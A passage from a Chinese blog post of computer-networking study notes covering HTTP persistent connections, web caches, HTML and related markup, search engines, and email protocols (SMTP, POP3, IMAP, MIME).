class="headerlink" title="持续连接"></a>持续连接</h3><p><strong>HTTP/1.1 协议使用持续连接 (persistent connection)。</strong></p><p>万维网服务器在发送响应后仍然在一段时间内保持这条连接，使同一个客户（浏览器）和该服务器可以继续在这条连接上传送后续的 HTTP 请求报文和响应报文。</p><p>这并不局限于传送同一个页面上链接的文档，而是只要这些文档都在同一个服务器上就行。</p><p>大部分主流浏览器默认用的就是持久连接</p><h4 id="工作方式-1"><a href="#工作方式-1" class="headerlink" title="工作方式"></a>工作方式</h4><p><strong>非流水线方式：</strong>客户在收到前一个响应后才能发出下一个请求。这比非持续连接的两倍 RTT 的开销节省了建立 TCP 连接所需的一个 RTT 时间。但服务器在发送完一个对象后，其 TCP 连接就处于空闲状态，浪费了服务器资源。</p><p>这和之前的应用层tcp停止等待协议类似，好比你妈叫你帮忙拿酱油，你屁颠屁颠跑去拿，然后递给妈妈，这时候妈妈又叫你帮忙拿盐，你又屁颠屁颠跑去拿盐，再回来递给妈妈，再然后，你妈又叫你……，就不能一次性说完吗，你愤怒的吼着，这不，你也会流水线方式嘛。</p><p><strong>流水线方式：</strong>客户在收到 HTTP 的响应报文之前就能够接着发送新的请求报文。一个接一个的请求报文到达服务器后，服务器就可连续发回响应报文。使用流水线方式时，客户访问所有的对象只需花费一个 RTT时间，使 TCP 连接中的空闲时间减少，提高了下载文档效率。 </p><p>老妈一听，哦对吼，拿起一张小纸条，写下要拿的东西，笑眯眯（毫无内疚）的递给你：宝贝你辛苦了，然后你就又屁颠屁颠跑去把几样东西一起拿过来递给妈妈</p><p>好的，让我们再看一种情况，如果服务器那边的资源没有更新，而浏览器已经请求过一次服务器的资源了，这时候浏览器这边每次打开该网址都要发起一次tcp连接去重复请求资源，是不是同样浪费资源呢，可不可以把这些没有更改过的资源存起来呢</p><h3 id="代理服务器（高速缓存）"><a href="#代理服务器（高速缓存）" class="headerlink" title="代理服务器（高速缓存）"></a>代理服务器（高速缓存）</h3><p>当当当当，便是代理服务器啦</p><p>代理服务器 (proxy server) 又称为万维网高速缓存 (Web cache)，它代表浏览器发出 HTTP 请求。</p><p>万维网高速缓存把最近的一些请求和响应暂存在本地磁盘中。</p><p>当与暂时存放的请求相同的新请求到达时，万维网高速缓存就把暂存的响应发送出去，而不需要按 URL 的地址再去互联网访问该资源。 </p><p>让我们来看一张图，在没有高速缓存的情况下，多台主机对资源发起请求</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409084722171.png" alt="image-20210409084722171"></p><p>那么这条链路上的时延会很大，因为所有万维网通信量都经过这条链路</p><p>那么，使用高速缓存呢</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409085015793.png" alt="image-20210409085015793"></p><p>具体步骤为</p><p>(1) 浏览器访问互联网的服务器时，要先与校园网的高速缓存建立 TCP 连接，并向高速缓存发出 HTTP 请求报文。</p><p>(2) 若高速缓存已经存放了所请求的对象，则将此对象放入 HTTP 响应报文中返回给浏览器。</p><p>(3) 否则，高速缓存就代表发出请求的用户浏览器，与互联网上的源点服务器建立 TCP 连接，并发送 HTTP 请求报文。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409085130673.png" alt="image-20210409085130673"></p><p>(4) 源点服务器将所请求的对象放在 HTTP 响应报文中返回给校园网的高速缓存。</p><p>(5) 高速缓存收到此对象后，先复制在其本地存储器中（为今后使用），然后再将该对象放在 HTTP 响应报文中，通过已建立的 TCP 连接，返回给请求该对象的浏览器。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409085015793.png" alt="image-20210409085015793"></p><h3 id="HTTP-的报文结构"><a href="#HTTP-的报文结构" class="headerlink" title="HTTP 的报文结构"></a>HTTP 的报文结构</h3><p>既然客户端要发起请求，是不是要写个什么东西告诉服务器呢，当然要，你要东西你不得先说出来你要啥让被请求方知道嘛，服务器响应也同样要给予客户端响应的，那这个东西是什么</p><p>HTTP 有两类报文：<br><strong>请求报文</strong>——从客户向服务器发送请求报文。<br><strong>响应报文</strong>——从服务器到客户的回答。</p><p>由于 HTTP 是面向正文的 (text-oriented)，因此在报文中的每一个字段都是一些 ASCII 码串，因而每个字段的长度都是不确定的。</p><p>先来看看请求报文的结构</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409085755836.png" alt="image-20210409085755836"></p><p>报文由三个部分组成，即开始行、首部行和实体主体。在请求报文中，开始行就是请求行。</p><ol><li><p>“方法”是面向对象技术中使用的专门名词。所谓“方法”就是对所请求的对象进行的操作，因此这些方法实际上也就是一些命令。因此，请求报文的类型是由它所采用的方法决定的。 </p><p>点击<a href="https://ypigy.gitee.io/2020/07/28/http%E5%8D%8F%E8%AE%AE/#%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F" target="_blank" rel="noopener">这里</a>查看请求方法</p></li><li><p>“URL”是所请求的资源的 URL。</p></li><li><p>“版本”是 HTTP 的版本。</p></li></ol><p>再来看看响应报文</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409090024473.png" alt="image-20210409090024473"></p><p>响应报文的开始行是状态行。状态行包括三项内容，即 HTTP 的版本，状态码，以及解释状态码的简单短语。</p><ol><li>状态码都是三位数字，具体查看<a href="https://ypigy.gitee.io/2020/07/28/http%E5%8D%8F%E8%AE%AE/#%E7%8A%B6%E6%80%81%E7%A0%81" target="_blank" rel="noopener">这里</a><ul><li>1xx 表示通知信息的，如请求收到了或正在进行处理。</li><li>2xx 表示成功，如接受或知道了。</li><li>3xx 表示重定向，表示要完成请求还必须采取进一步的行动。</li><li>4xx 表示客户的差错，如请求中有错误的语法或不能完成。</li><li>5xx 表示服务器的差错，如服务器失效无法完成请求。</li></ul></li></ol><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>万维网站点可以使用 Cookie 来跟踪用户。具体可以点击<a href="https://ypigy.gitee.io/2020/07/28/http%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">这里</a></p><p>Cookie 表示在 HTTP 服务器和客户之间传递的状态信息。<br>使用 Cookie 的网站服务器为用户产生一个唯一的识别码。利用此识别码，网站就能够跟踪该用户在该网站的活动。 </p><h2 id="万维网的文档"><a href="#万维网的文档" class="headerlink" title="万维网的文档"></a>万维网的文档</h2><h3 id="超文本标记语言-HTML"><a href="#超文本标记语言-HTML" class="headerlink" title="超文本标记语言 HTML"></a>超文本标记语言 HTML</h3><blockquote><p>超文本标记语言 HTML 中的 Markup 的意思就是“设置标记”。</p><p>HTML 定义了许多用于排版的命令（即标签）。</p><p>HTML 把各种标签嵌入到万维网的页面中。这样就构成了所谓的HTML 文档。HTML 文档是一种可以用任何文本编辑器创建的 ASCII 码文件。 </p></blockquote><p>仅当 HTML 文档是以 .html 或 .htm 为后缀时，浏览器才对此文档的各种标签进行解释。</p><p>如 HTML 文档改换以 .txt 为其后缀，则 HTML 解释程序就不对标签进行解释，而浏览器只能看见原来的文本文件。</p><p>当浏览器从服务器读取 HTML 文档后，就按照 HTML 文档中的各种标签，根据浏览器所使用的显示器的尺寸和分辨率大小，重新进行排版并恢复出所读取的页面。详细了解html点击<a href="https://www.runoob.com/html/html-tutorial.html" target="_blank" rel="noopener">这里</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>你好<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h3><p>XML (Extensible Markup Language) 是可扩展标记语言，它和 HTML 很相似。</p><p>但 XML 的设计宗旨是传输数据，而不是显示数据（HTML 是为了在浏览器上显示数据）。</p><p>XML 不是要替换 HTML，而是对 HTML 的补充。</p><h3 id="XHTML"><a href="#XHTML" class="headerlink" title="XHTML"></a>XHTML</h3><p>XHTML (Extensible HTML) 是可扩展超文本标记语言，它与 HTML 4.01 几乎是相同的。</p><p>但 XHTML 是更严格的 HTML 版本，也是一个 W3C 标准（2000年1月），是作为一种 XML 应用被重新定义的 HTML，并将逐渐取代 HTML。</p><p>新的浏览器都支持 XHTML。</p><h3 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h3><p>CSS (Cascading Style Sheets) 是层叠样式表，它是一种样式表语言，用于<a href="https://www.processon.com/view/link/60434587e401fd4f9cba7ccd" target="_blank" rel="noopener">为 HTML 文档定义布局</a>。</p><p>CSS 与 HTML 的区别就是：HTML 用于结构化内容，而 CSS 则用于格式化结构化的内容。</p><p>通俗的讲便是，html用于定义页面架构，而css则是决定这些</p><h3 id="动态万维网文档"><a href="#动态万维网文档" class="headerlink" title="动态万维网文档"></a>动态万维网文档</h3><p>当你在自己电脑上写了一个页面，不包括任何从服务器上请求过来的数据（比如使用AJAX），然后用浏览器打开看的时候，这个时候它便是一个静态页面，如果你把它放到服务器上，那么它也依然是静态页面，因为里面的数据不能也不会发生改变，它是一个死页面</p><p><strong>静态文档</strong>是指该文档创作完毕后就存放在万维网服务器中，在被用户浏览的过程中，内容不会改变。 </p><p><strong>动态文档</strong>是指文档的内容是在浏览器访问万维网服务器时才由应用程序动态创建。</p><p>动态文档和静态文档之间的主要差别体现在服务器一端。这主要是文档内容的生成方法不同。而从浏览器的角度看，这两种文档并没有区别。 </p><p>那么，我们如何动态改变页面的显示数据呢，毕竟，一个新闻网站每天的新闻都是新的把，购物网站的商品每天也会推荐给你不同的吧，总不能一天写一个新页面放到服务器上吧</p><h3 id="万维网服务器功能的扩充"><a href="#万维网服务器功能的扩充" class="headerlink" title="万维网服务器功能的扩充"></a>万维网服务器功能的扩充</h3><ol><li><p>增加另一个应用程序，用来处理浏览器发来的数据，并创建动态文档。</p></li><li><p>增加一个机制，用来使万维网服务器把浏览器发来的数据传送给这个应用程序，然后万维网服务器能够解释这个应用程序的输出，并向浏览器返回 HTML 文档。</p></li></ol><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409092216962.png" alt="image-20210409092216962"></p><p>就是如图所示：使用CGI来创建动态文档，那么CGI是啥</p><h3 id="CGI-程序"><a href="#CGI-程序" class="headerlink" title="CGI 程序"></a>CGI 程序</h3><p>CGI 程序的正式名字是 CGI 脚本 (script)。</p><p>“脚本”指的是一个程序，它被另一个程序（解释程序）而不是计算机的处理机来解释或执行。</p><p>脚本运行起来要比一般的编译程序要慢，因为它的每一条指令先要被另一个程序来处理（这就要一些附加的指令），而不是直接被指令处理器来处理。 </p><h3 id="活动万维网文档"><a href="#活动万维网文档" class="headerlink" title="活动万维网文档"></a>活动万维网文档</h3><p>活动文档 (active document) 技术把所有的工作都转移给浏览器端。</p><p>每当浏览器请求一个活动文档时，服务器就返回一段程序副本在浏览器端运行。</p><p>活动文档程序可与用户直接交互，并可连续地改变屏幕的显示。<br>由于活动文档技术不需要服务器的连续更新传送，对网络带宽的要求也不会太高。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409093246471.png" alt="image-20210409093246471"></p><p>JAVA是活动文档技术的一部分，这里不展开，可自行百度</p><h2 id="万维网的信息检索系统"><a href="#万维网的信息检索系统" class="headerlink" title="万维网的信息检索系统"></a>万维网的信息检索系统</h2><p>在万维网中用来进行搜索的程序叫做搜索引擎。</p><h3 id="全文检索搜索"><a href="#全文检索搜索" class="headerlink" title="全文检索搜索"></a>全文检索搜索</h3><p>全文检索搜索引擎是一种纯技术型的检索工具。它的工作原理是通过搜索软件到互联网上的各网站收集信息，找到一个网站后可以从这个网站再链接到另一个网站。然后按照一定的规则建立一个很大的在线数据库供用户查询。</p><p>用户在查询时只要输入关键词，就从已经建立的索引数据库上进行查询（并不是实时地在互联网上检索到的信息）。</p><p>著名的有google、baidu 以及bing</p><h3 id="分类目录搜索"><a href="#分类目录搜索" class="headerlink" title="分类目录搜索"></a>分类目录搜索</h3><p><strong>分类目录搜索引擎</strong>并不采集网站的任何信息，而是利用各网站向搜索引擎提交的网站信息时填写的关键词和网站描述等信息，经过人工审核编辑后，如果认为符合网站登录的条件，则输入到分类目录的数据库中，供网上用户查询。</p><p>分类目录搜索也叫做<strong>分类网站搜索</strong>。 </p><p>著名的有雅虎、新浪以及网易</p><h3 id="垂直搜索引擎"><a href="#垂直搜索引擎" class="headerlink" title="垂直搜索引擎"></a>垂直搜索引擎</h3><p><strong>垂直搜索引擎 (Vertical Search Engine)</strong> 针对某一特定领域、特定人群或某一特定需求提供搜索服务。<br>垂直搜索也是提供关键字来进行搜索的，但被放到了一个行业知识的上下文中，返回的结果更倾向于信息、消息、条目等。 </p><h2 id="博客和微博"><a href="#博客和微博" class="headerlink" title="博客和微博"></a>博客和微博</h2><h3 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h3><p>博客是万维网日志 (weblog) 的简称。也有人把 blog 进行音译，译为“部落格”，或“部落阁”。还有人用“博文”来表示“博客文章”。</p><p>Weblog 这个新词是 Jorn Barger 于 1997 年创造的。</p><p>简写的 blog（这是今天最常用的术语）则是 Peter Merholz 于 1999 年创造的。</p><p>有人把 blog 既当作名词，也当作动词，表示编辑博客或写博客。 </p><p>博客已经极大地扩充了互联网的应用和影响 。</p><p>在博客出现以前，网民是互联网上内容的消费者。</p><p>但博客改变了这种情况，网民不仅是互联网上内容的消费者，而且还是互联网上内容的生产者 。  </p><h3 id="微博"><a href="#微博" class="headerlink" title="微博"></a>微博</h3><p>没啥好说的，大部分人都在用，它和博客最大的区别就是，博客更像是一个个人网站，用来写一些比较大型的文章或技术内容，而微博更多则是分享自己的片段、碎语，三言两语</p><h2 id="社交网络"><a href="#社交网络" class="headerlink" title="社交网络"></a>社交网络</h2><p>社交网站 SNS (Social Networking Site) 是近年来发展非常迅速的一种网站，其作用是为一群拥有相同兴趣与活动的人创建在线社区</p><h1 id="电子邮件"><a href="#电子邮件" class="headerlink" title="电子邮件"></a>电子邮件</h1><h2 id="电子邮件概述"><a href="#电子邮件概述" class="headerlink" title="电子邮件概述"></a>电子邮件概述</h2><p>电子邮件 (e-mail)：指使用电子设备交换的邮件及其方法。电子邮件是互联网上使用得最多的和最受用户欢迎的一种应用。</p><p><strong>优点：</strong>使用方便，传递迅速，费用低廉，可以传送多种类型的信息（包括：文字信息，声音和图像等）。</p><p>电子邮件的重要标准包括以下部分</p><ol><li>简单邮件发送协议：SMTP</li><li>互联网文本报文格式</li><li>通用互联网邮件扩充 MIME</li><li>邮件读取协议：POP3 和 IMAP</li></ol><p>通过以下图片理解邮件通信的各个组成部分</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409100723015.png" alt="image-20210409100723015"></p><h3 id="用户代理-UA-User-Agent"><a href="#用户代理-UA-User-Agent" class="headerlink" title="用户代理 UA (User Agent)"></a>用户代理 UA (User Agent)</h3><p>用户代理 UA 就是用户与电子邮件系统的接口，是电子邮件客户端软件。<br>用户代理的功能：撰写、显示、处理和通信。</p><p>邮件服务器的功能是发送和接收邮件，同时还要向发信人报告邮件传送的情况（已交付、被拒绝、丢失等）。</p><p>邮件服务器按照客户 - 服务器方式工作。邮件服务器需要使用发送和读取两个不同的协议。</p><p>用户与电子邮件系统的接口。又被称为电子邮件客户端软件。</p><p>基本功能：撰写、显示、处理和通信。</p><h3 id="邮件服务器-Mail-Server"><a href="#邮件服务器-Mail-Server" class="headerlink" title="邮件服务器 (Mail Server)"></a>邮件服务器 (Mail Server)</h3><p>又被称为邮件传输代理。</p><p>功能：发送和接收邮件，同时还要向发信人报告邮件传送的情况。<br>按照客户 – 服务器方式工作。</p><p>在发送和读取邮件时使用两个不同的协议：SMTP，POP3。</p><h3 id="邮件发送和读取协议"><a href="#邮件发送和读取协议" class="headerlink" title="邮件发送和读取协议"></a>邮件发送和读取协议</h3><p>邮件发送和读取使用不同的协议协议。</p><ol><li><p>简单邮件发送协议 SMTP：用于在用户代理向邮件服务器或邮件服务器之间发送邮件。</p></li><li><p>邮局协议 POP3：用于用户代理从邮件服务器读取邮件。</p></li></ol><p>通信双发既可以是客户也可以是服务器，当你是写信方时，你便是客户，收信方是服务器，放过来便是相反，对方是客户，你是服务器</p><p>还要注意的是：<strong>SMTP和POP3（或IMAP）都是使用TCP连接来传送邮件的，目的是为了可靠地传送邮件。</strong></p><p>仔细观察下面的图</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409101409058.png" alt="image-20210409101409058"></p><p>发送方发送邮件是通过一条跨越互联网的线过去到达服务器端端，所以请注意：<strong>邮件不会在互联网中的某个中间邮件服务器落地</strong></p><p>发送方是通过“推（push）”的方式讲邮件发送出去，而接收方则是通过“拉（pull）”的方式接收邮件的</p><h3 id="发送和接收电子邮件的几个重要步骤"><a href="#发送和接收电子邮件的几个重要步骤" class="headerlink" title="发送和接收电子邮件的几个重要步骤"></a>发送和接收电子邮件的几个重要步骤</h3><ol><li>发件人调用 PC 中的用户代理撰写和编辑要发送的邮件。</li><li>发件人的用户代理把邮件用 SMTP 协议发给发送方邮件服务器。</li><li>SMTP 服务器把邮件临时存放在邮件缓存队列中，等待发送。</li><li>发送方邮件服务器的 SMTP 客户与接收方邮件服务器的 SMTP服务器建立 TCP 连接，然后就把邮件缓存队列中的邮件依次发送出去。 </li><li>运行在接收方邮件服务器中的SMTP服务器进 程收到邮件后，把邮件放入收件人的用户邮箱中，等待收件人进行读取。 </li><li>收件人在打算收信时，就运行PC机中的用户代理，使用POP3（或 IMAP）协议读取发送给自己的邮件。 </li></ol><h3 id="电子邮件的组成"><a href="#电子邮件的组成" class="headerlink" title="电子邮件的组成"></a>电子邮件的组成</h3><p>电子邮件由信封 (envelope) 和内容 (content) 两部分组成。</p><p>电子邮件的传输程序根据邮件信封上的信息来传送邮件。用户在从自己的邮箱中读取邮件时才能见到邮件的内容。</p><p>在邮件的信封上，最重要的就是收件人的地址。 </p><h4 id="电子邮件地址的格式"><a href="#电子邮件地址的格式" class="headerlink" title="电子邮件地址的格式"></a>电子邮件地址的格式</h4><blockquote><p>收件人邮箱名@邮箱所在主机的域名      </p></blockquote><p>这便是TCP/IP 体系的电子邮件系统规定电子邮件地址的格式</p><p>符号“@”读作“at”，表示“在”的意思。<br>例如电子邮件地址 <a href="mailto:xiexiren@tsinghua.org.cn">xiexiren@tsinghua.org.cn</a></p><p>这里要注意两点</p><ol><li><p>这个用户名（ xiexiren）在该域名的范围内是唯一的。 </p></li><li><p>邮箱所在的主机的域名（tsinghua.org.cn）在全世界必须是唯一的 </p></li></ol><h2 id="简单邮件传送协议-SMTP"><a href="#简单邮件传送协议-SMTP" class="headerlink" title="简单邮件传送协议 SMTP"></a>简单邮件传送协议 SMTP</h2><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409100723015.png" alt="image-20210409100723015"></p><p>SMTP 规定了在两个相互通信的 SMTP 进程交换信息的方法。</p><p>SMTP 使用客户–服务器方式。</p><p>SMTP 基于 TCP 实现客户与服务器的通信。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409102248512.png" alt="image-20210409102248512"></p><p>SMTP 是一个基于文本的 （即 ASCII 码） 的协议。 </p><p>SMTP 客户与服务器之间采用命令-响应方式进行交互。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409102308510.png" alt="image-20210409102308510"></p><p>SMTP 基于 TCP 实现客户与服务器之间的通信。</p><h3 id="SMTP-通信的三个阶段"><a href="#SMTP-通信的三个阶段" class="headerlink" title="SMTP 通信的三个阶段"></a>SMTP 通信的三个阶段</h3><p><strong>连接建立：</strong>连接是在发送主机的 SMTP 客户和接收主机的 SMTP 服务器之间建立的。SMTP不使用中间的邮件服务器。   </p><p><strong>邮件传送</strong></p><p><strong>连接释放：</strong>邮件发送完毕后，SMTP 应释放 TCP 连接。 </p><p>通过图来理解这个过程（这个过程其实和http协议进行通信有点类似）</p><ol><li><p>首先是建立连接用于传送邮件</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409102449163.png" alt="image-20210409102449163"></p></li><li><p>接着就是传送邮件了</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409102751440.png" alt="image-20210409102751440"></p></li><li><p>然后就是邮件传送完，连接释放</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409102825471.png" alt="image-20210409102825471"></p></li></ol><h2 id="电子邮件的信息格式"><a href="#电子邮件的信息格式" class="headerlink" title="电子邮件的信息格式"></a>电子邮件的信息格式</h2><p>一个电子邮件分为信封和内容两大部分。</p><p>RFC 5322 只规定了邮件内容中的首部 (header) 格式，而对邮件的主体 (body) 部分则让用户自由撰写。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409103109432.png" alt="image-20210409103109432"></p><p>对图中各个名词进行解释</p><ol><li>“To:” 后面填入一个或多个收件人的电子邮件地址。用户只需打开地址簿，点击收件人名字，收件人的电子邮件地址就会自动地填入到合适的位置上。</li><li>“Subject:” 是邮件的主题。它反映了邮件的主要内容，便于用户查找邮件。</li><li>“Cc:”  表示应给某某人发送一个邮件副本。</li><li>“From” 和 “Date” 表示发信人的电子邮件地址和发信日期。</li><li>“Reply-To” 是对方回信所用的地址。 </li></ol><h2 id="邮件读取协议-POP3-和-IMAP"><a href="#邮件读取协议-POP3-和-IMAP" class="headerlink" title="邮件读取协议 POP3 和 IMAP"></a>邮件读取协议 POP3 和 IMAP</h2><p>正如标题：现在有两个常用的邮件读取协议：</p><ol><li>POP3：邮局协议 (Post Office Protocol) 第3个版本 </li><li>IMAP：网际报文存取协议 (Internet Message Access Protocol)</li></ol><p>首先了解下POP3协议</p><h3 id="POP3-协议"><a href="#POP3-协议" class="headerlink" title="POP3 协议"></a>POP3 协议</h3><p>POP3 使用客户–服务器方式。</p><p>POP3 基于TCP实现客户与服务器的通信。</p><p>POP3 支持用户鉴别。</p><p><strong>POP3 服务器会删除被用户读取了的邮件。</strong>（也就是阅完即焚）</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409103251660.png" alt="image-20210409103251660"></p><h3 id="IMAP-协议"><a href="#IMAP-协议" class="headerlink" title="IMAP 协议"></a>IMAP 协议</h3><p>IMAP 使用客户–服务器方式。</p><p>IMAP 基于TCP实现客户与服务器的通信。</p><p>IMAP是一个联机协议。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409103428001.png" alt="image-20210409103428001"></p><p>IMAP的特点如下</p><ol><li>连接后只下载<strong>邮件首部</strong>（部分下载）。</li><li>用户直接在IMAP服务器上创建和管理文件夹。</li><li>用户可以<strong>搜索</strong>邮件内容。</li><li>用户可以在不同的地方使用不同的计算机<strong>随时</strong>上网阅读和处理自己的邮件。</li><li>允许收信人只读取邮件中的<strong>某一个部分</strong>。</li><li><strong>缺点：</strong>要想查阅邮件，必须先联网。</li></ol><h3 id="IMAP-与-POP3-比较"><a href="#IMAP-与-POP3-比较" class="headerlink" title="IMAP 与 POP3 比较"></a>IMAP 与 POP3 比较</h3><table><thead><tr><th>操作位置</th><th>操作内容</th><th>IMAP</th><th>POP3</th></tr></thead><tbody><tr><td>收件箱</td><td>阅读、标记、移动、删除邮件等</td><td>客户端与邮箱更新同步</td><td>仅在客户端内</td></tr><tr><td>发件箱</td><td>保存到已发送</td><td>客户端与邮箱更新同步</td><td>仅在客户端内</td></tr><tr><td>创建文件夹</td><td>新建自定义的文件夹</td><td>客户端与邮箱更新同步</td><td>仅在客户端内</td></tr><tr><td>草稿</td><td>保存草稿</td><td>客户端与邮箱更新同步</td><td>仅在客户端内</td></tr><tr><td>垃圾文件夹</td><td>接收并移入垃圾文件夹的邮件</td><td>支持</td><td>不支持</td></tr><tr><td>广告邮件</td><td>接收并移入广告邮件夹的邮</td><td>支持</td><td>不支持</td></tr></tbody></table><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409104202426.png" alt="image-20210409104202426"></p><p>这里要好好区别，邮件读取协议 POP 或 IMAP 与邮件传送协议 SMTP 完全不同。</p><p>发信人的用户代理向源邮件服务器发送邮件，以及源邮件服务器向目的邮件服务器发送邮件，都是使用 SMTP 协议。<br>而 POP 协议或 IMAP 协议则是用户从目的邮件服务器上读取邮件所使用的协议。 </p><p>简单来说：发邮件是用<strong>SMTP</strong>协议，而收文件是在<strong>pop3</strong>和<strong>imap</strong>协议中挑一个去收</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409104425895.png" alt="image-20210409104425895"></p><h2 id="基于万维网的电子邮件"><a href="#基于万维网的电子邮件" class="headerlink" title="基于万维网的电子邮件"></a>基于万维网的电子邮件</h2><p>用户代理 (UA) 的缺点：必须在计算机中安装用户代理软件可能不能安装或不允许安装。所以会导致不方便收邮件，而且，很重要的是，你要收发文件，两个人都要开着电脑，啊这……</p><p>而这时候通过之前学的万维网以及http协议，我们是否可以把这个平台搬到互联网上呢，答案是可以的，你现在的用的邮箱不就是吗，所以，万维网电子邮件的优点是啥</p><ul><li>不需要在计算机中再安装用户代理软件。</li><li>计算机能联网，就能非常方便地收发电子邮件。</li><li>电子邮件界面非常友好。</li></ul><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409104824166.png" alt="image-20210409104824166"></p><p>通过图可以了解到其有两个特点</p><ol><li>发送、接收电子邮件时使用 HTTP 协议。</li><li>两个邮件服务器之间传送邮件时使用 SMTP。</li></ol><p>好的，互联网解决了我们之间的电子邮件交流，现在另一个问题来了，我们使用的SMTP协议好像没法发图片或者其他多媒体文件（SMTP 不能传送可执行文件或其他的二进制对象。），这咋整，我想发鸭，而且还有一个问题：SMTP 限于传送 7 位的 ASCII 码。许多其他非英语国家的文字（如中文、俄文，甚至带重音符号的法文或德文）就无法传送。甚至还存在这个问题：SMTP 服务器会拒绝超过一定长度的邮件。那怎么解决呢</p><h2 id="通用互联网邮件扩充-MIME"><a href="#通用互联网邮件扩充-MIME" class="headerlink" title="通用互联网邮件扩充 MIME"></a>通用互联网邮件扩充 MIME</h2><p>对的，就是它，它可以帮我们解决上面遇到的问题，那是不是意味着就可以直接用他来取代SMTP呢，并不是这样的</p><p>MIME 的意图<strong>是继续使用目前的 [RFC 822] 格式</strong>，但<strong>增加了邮件主体的结构</strong>，并<strong>定义了传送非 ASCII 码的编码规则</strong>。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409105253804.png" alt="image-20210409105253804"></p><p>它主要包括三个部分</p><ol><li><p><strong>5 个新的邮件首部字段</strong>，它们可包含在原有首部中。这些字段提供了有关邮件主体的信息。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409105407947.png" alt="MIME首部"></p></li><li><p>定义了许多<strong>邮件内容的格式</strong>，对多媒体电子邮件的表示方法进行了标准化。</p></li><li><p>定义了<strong>传送编码</strong>，可对任何内容格式进行转换，而不会被邮件系统改变。</p><table><thead><tr><th>编码方法</th><th>说明</th></tr></thead><tbody><tr><td>7bit</td><td>7  位  ASCII  编码，每行不能超过  1000  个字符（包括回车和换行）。缺省编码方法。</td></tr><tr><td>8bit</td><td>8  位非  ASCII  编码，每行不能超过  1000  个字节（包括回车和换行）。</td></tr><tr><td>Binary</td><td>8  位非  ASCII  编码，任意长度的字节串。</td></tr><tr><td>Base64</td><td>将任意长度的字节串转换为用 7 位  ASCII 